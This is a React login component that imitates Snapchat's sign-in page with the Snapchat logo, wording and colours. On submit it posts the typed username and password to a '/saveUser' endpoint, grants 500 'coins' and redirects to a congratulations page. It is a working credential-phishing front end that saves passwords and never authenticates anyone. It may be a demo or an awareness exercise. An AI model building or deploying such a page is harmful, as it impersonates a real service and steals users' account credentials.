import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useCoins } from "../context/CoinsContext";
import snapchatLogo from "../assets/snapchat-logo.svg";

const Login: React.FC = () => {
  const navigate = useNavigate();
  const { setCoins } = useCoins();
  const [credentials, setCredentials] = useState({
    username: "",
    password: "",
  });
  const [error, setError] = useState("");
  // const [attempt, setAttempt] = useState(0); // Track login attempts

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCredentials({
      ...credentials,
      [e.target.name]: e.target.value,
    });
  };

  // const handleSubmit = async (e: React.FormEvent) => {
  //   e.preventDefault();

  //   try {
  //     const response = await fetch("http://localhost:5001/saveUser", {
  //       method: "POST",
  //       headers: {
  //         "Content-Type": "application/json",
  //       },
  //       body: JSON.stringify(credentials),
  //     });

  //     if (response.ok) {
  //       setCoins(500);
  //       localStorage.setItem("username", credentials.username);
  //       navigate("/congratulations"); // Redirect to Congratulations page
  //     } else {
  //       setError("Failed to save user details.");
  //     }
  //   } catch (err) {
  //     setError("Error logging in. Try again.");
  //     console.error(err);
  //   }
  // };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(""); // Clear previous errors
  
    try {
      const response = await fetch("http://localhost:5001/saveUser", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(credentials),
      });
  
      const data = await response.json(); // Parse response JSON
  
      if (response.ok) {
        setCoins(500);
        localStorage.setItem("username", credentials.username);
        navigate("/congratulations"); // Redirect to Congratulations page
      } else {
        setError(data.error || "Failed to save user details.");
      }
    } catch (err) {
      setError("Error logging in. Try again.");
      console.error("Login error:", err);
    }
  };
  


  return (
    <div className="flex items-center justify-center min-h-screen bg-[linear-gradient(180deg,#FFFFFF,#FFFFFF)]">
      <div className="w-[400px] bg-[#FFFFFF] p-10 rounded-2xl shadow-2xl border-4 border-[#FFFFFF]">
        <div className="flex justify-center">
          <img src={snapchatLogo} alt="Snapchat Logo" className="w-16" />
        </div>

        <h2
          className="text-center text-2xl font-bold mt-5"
          style={{ fontFamily: "Avenir Next, sans-serif", color: "#000000" }}
        >
          Log in to Snapchat
        </h2>

        <form onSubmit={handleSubmit} className="mt-6 space-y-5">
          <div>
            <label
              className="block text-sm font-semibold mb-2"
              style={{ fontFamily: "Avenir Next, sans-serif", color: "#000000" }}
            >
              Username or Email
            </label>
            <input
              type="text"
              name="username"
              value={credentials.username}
              onChange={handleChange}
              placeholder=" "
              className="w-full px-4 py-3 rounded-lg border border-black bg-white text-black focus:ring-2 focus:ring-black focus:outline-none"
              required
            />
          </div>

          <div>
            <label
              className="block text-sm font-semibold mb-2"
              style={{ fontFamily: "Avenir Next, sans-serif", color: "#000000" }}
            >
              Password
            </label>
            <input
              type="password"
              name="password"
              value={credentials.password}
              onChange={handleChange}
              className="w-full px-4 py-3 rounded-lg border border-black bg-white text-black focus:ring-2 focus:ring-black focus:outline-none"
              required
            />
            <div className="text-right mt-2">
              <button
                type="button"
                className="text-sm font-semibold hover:underline"
                style={{ fontFamily: "Avenir Next, sans-serif", color: "#000000" }}
              >
                Forgot Password
              </button>
            </div>
          </div>

          {error && <p className="text-red-500 text-sm text-center">{error}</p>}

          <button
            type="submit"
            className="w-full bg-[#FFF700] text-black py-3 rounded-full font-bold text-lg hover:bg-white transition-all"
            style={{ fontFamily: "Avenir Next, sans-serif" }}
          >
            Log In
          </button>
        </form>

        <div className="text-center text-sm mt-6">
          <span
            style={{ fontFamily: "Avenir Next, sans-serif", color: "#000000" }}
          >
            New To Snapchat?{" "}
          </span>
          <button
            className="font-bold hover:underline"
            style={{ fontFamily: "Avenir Next, sans-serif", color: "#000000" }}
          >
            Sign Up
          </button>
        </div>
      </div>
    </div>
  );
};

export default Login;